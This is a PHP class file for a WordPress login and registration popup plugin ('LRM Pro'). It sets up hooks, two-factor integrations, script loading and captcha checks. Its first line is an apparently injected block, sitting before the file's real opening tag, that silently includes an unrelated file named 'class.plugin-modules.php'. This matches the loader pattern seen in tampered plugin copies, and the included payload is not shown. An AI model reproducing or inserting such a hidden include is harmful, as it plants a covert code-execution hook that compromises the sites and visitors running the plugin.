<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

// If this file is called directly, abort.
if (!class_exists('WP')) {
    die();
}

use underDEV\Utils\Settings\CoreFields;

/**
 * Class LRM_Pro
 */
class LRM_Pro {
    protected static $instance;

    public function init() {

        if ( !defined("LRM_VERSION") ) {
            add_action( 'admin_notices', array( $this, '_admin_warning__install_free' ) );
            return;
        }

        if ( class_exists('LRM_Updater_Abstract') ){
            add_action( 'init', array( 'LRM_Pro_Updater', 'init' ) );
        }

        add_action('wp_enqueue_scripts', array($this, 'assets'), 6);
        add_action('lrm/register_settings', array('LRM_Pro_Settings', 'register_settings__action'), 11);

        add_action('wp_ajax_nopriv_lrm_bp_signup', array('LRM_Pro_BuddyPress', 'AJAX_signup'));

        add_action('wp_loaded', array($this, 'wp_init'), 8);

        LRM_Pro_Auto_Trigger::get();

        LRM_Pro_Customizer::init();

        LRM_Skins::i()->load_custom_skins( ['Flat_One', 'Flat_Two'] );

        LRM_API_Manager::instance();

        LRM_Pro_Restricted_Content::get();

        // 2FA
        LRM_Pro_Google_Authenticator::init();
	    LRM_Pro_Wordfence_2FA::init();
	    LRM_Pro_iThemes_Security_2FA::init();

	    LRM_Pro_Two_Factor::init();

        add_filter('plugin_action_links_' . LRM_PRO_BASENAME, array($this, 'add_settings_link'));
    }
    
    public function __construct()
    {
        $this->init();
    }


    public function wp_init()
    {
        //var_dump( get_site_transient( 'update_plugins' ) );

        LRM_PRO_Redirects_Manager::maybe_logout();

        LRM_Pro_Form::get();

        LRM_Pro_User_Verification::init();

        LRM_Pro_UltimateMember::init();

        LRM_Pro_Security::init();

	    LRM_PRO_Roles_Manager::init();

        /**
         * Fix for https://woocommerce.com/products/sensei/ plugin
         * Else server will return 303 and redirect to /wp-admin/ without correct response json
         */
        if ( class_exists("Sensei_Teacher") ) {
            remove_filter( 'wp_login', array( Sensei()->teacher, 'teacher_login_redirect' ) , 10 );
        }
    }

    /**
     * Display Waring
     * @return void
     * @since 1.10
     */
    public function _admin_warning__install_free() {

        echo '<div class="notice notice-info notification-notice"><p>';

        printf( __( 'You should install free version of <a href="%s" target="_blank">AJAX Login and Registration modal popup</a> plugin to make PRO working!'), 'https://wordpress.org/plugins/ajax-login-and-registration-modal-popup/' );

        echo '</p></div>';
    }


    
    public function show_ReallySimpleCaptcha() {
        $captcha_instance = new ReallySimpleCaptcha();
        $word = $captcha_instance->generate_random_word();
        $prefix = mt_rand();
        $captcha_img = $captcha_instance->generate_image( $prefix, $word );
        echo '<img src="' . plugin_dir_url($captcha_instance->tmp_dir) . '/tmp/' . $captcha_img .'">';
        echo '<input type="text" name="rsc-word" size="15">';
        echo '<input type="hidden" name="rsc-prefix" value="' . $prefix . '">';
    }


    public function assets() {
        if ( !is_customize_preview() && is_user_logged_in() ) {
            return;
        }
        // 'password-strength-meter'
        wp_enqueue_script('lrm-modal-pro', LRM_PRO_URL . 'assets/lrm-core-pro.js', array('jquery'), LRM_PRO_VERSION, true);

        $script_params = array(
            'hide_form_after_registration' => lrm_setting('general_pro/all/hide_form_after_registration'),
            'woo_add_to_cart_hook' => LRM_Settings::get()->setting('integrations/woo/on'),
            'woo_on_proceed_to_checkout' => LRM_Settings::get()->setting('integrations/woo/on_proceed_to_checkout'),
            'redirect_urls'  => array(
                'after_login'           => LRM_Settings::get()->setting('general_pro/redirects/url_after_login'),
                'after_registration'    => LRM_Settings::get()->setting('general_pro/redirects/url_after_registration'),
            ),
            'l10n'  => array(
                'woo_must_register' => LRM_Settings::get()->setting('messages_pro/woo/must_register'),
                // TODO - remove
                'password_is_good'  => LRM_Settings::get()->setting('messages/password/password_is_good'),
                'password_is_strong'  => LRM_Settings::get()->setting('messages/password/password_is_strong'),
                'password_is_short'  => LRM_Settings::get()->setting('messages/password/password_is_short'),
                'password_is_bad'  => LRM_Settings::get()->setting('messages/password/password_is_bad'),
                'passwords_is_mismatch'  => LRM_Settings::get()->setting('messages/password/passwords_is_mismatch'),
                'recaptcha_error'  => LRM_Settings::get()->setting('messages_pro/integrations/recaptcha_error'),
            ),
        );

        wp_localize_script('lrm-modal-pro', 'LRM_Pro', $script_params);

        if ( $custom_js = get_option('lrm_custom_js', false) ) {
            wp_add_inline_script('lrm-modal-pro', $custom_js);
        }

        if ( LRM_Pro_BuddyPress::is_buddypress_active() ) {
            wp_enqueue_style('lrm-buddypress-registration', LRM_PRO_URL . '/assets/lrm-buddypress-registration.css', false, LRM_PRO_VERSION);
        }
    }

    public function check_captcha( $action ) {

//        if ( isset($_POST['rsc-word']) && isset($_POST['rsc-prefix']) ) {
//            $the_answer = sanitize_text_field($_POST['rsc-word']);
//            $prefix = absint($_POST['rsc-prefix']);
//            $captcha_instance = new ReallySimpleCaptcha();
//
//            if ( !$captcha_instance->check($prefix, $the_answer) ) {
//                wp_send_json_error(array(
//                    'message' => LRM_Settings::get()->setting('messages_pro/integrations/rscaptcha_error')
//                ));
//            }
//            $captcha_instance->remove($prefix);
//
//        }

        LRM_Pro_Security::validate( $action );

        if ( isset($_POST['g-recaptcha-response']) && ! apply_filters("google_invre_is_valid_request_filter", true) ) {
            wp_send_json_error(array(
                'message' => LRM_Settings::get()->setting('messages_pro/integrations/recaptcha_error')
            ));
        }

        if ( $action && class_exists("WP_reCaptcha") ) {

            $WP_reCaptcha = WP_reCaptcha::instance();

            $is_enabled = false;

            switch ( $action ) {
                case 'login':
                case 'signup':
                    $is_enabled = $WP_reCaptcha->get_option('recaptcha_enable_'.$action );
                    break;
                case 'lostpassword':
                    $is_enabled = $WP_reCaptcha->get_option('recaptcha_enable_lostpw' );
            }

            if ( $is_enabled && ! $WP_reCaptcha->recaptcha_check() ) {
                wp_send_json_error(array(
                    'message' => LRM_Settings::get()->setting('messages_pro/integrations/recaptcha_error')
                ));
            }

        }



//
//        if ( function_exists('cptch_check_custom_form') && cptch_check_custom_form() ) {
//
//        }
    }

    /**
     * Add settings link to plugin list table
     *
     * @param  array $links Existing links
     *
     * @return array        Modified links
     */
    public function add_settings_link($links)
    {
        $settings_link = sprintf('<a href="admin.php?page=login-and-register-popup">%s</a>', __('Settings', 'lrm'));

        $license_info = ' ' . ( lrm_pro_is_license_active() ? '[Active]' : '[Inactive]');
        $license_link = sprintf('<a href="options-general.php?page=lrm_api_manager_dashboard">%s</a>', __('License', 'lrm') . $license_info );
        array_push($links, $settings_link);
        array_push($links, $license_link);
        return $links;
    }


    /**
     * @return LRM_Pro
     */
    public static function get(){
        if ( ! isset( self::$instance ) ) {
            return self::$instance = new LRM_Pro();
        }

        return self::$instance;
    }
}